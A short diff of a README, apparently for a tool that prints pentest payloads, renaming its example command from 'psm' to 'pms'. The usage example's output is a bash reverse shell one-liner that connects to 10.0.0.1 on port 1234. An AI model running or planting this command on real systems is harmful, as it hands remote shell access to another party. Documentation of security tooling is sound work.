@@ -17,7 +17,7 @@ source ~/.bashrc
 ```
 and now you can use like :
 ```sh
-$ psm bash
+$ pms bash
 bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
 ```
 
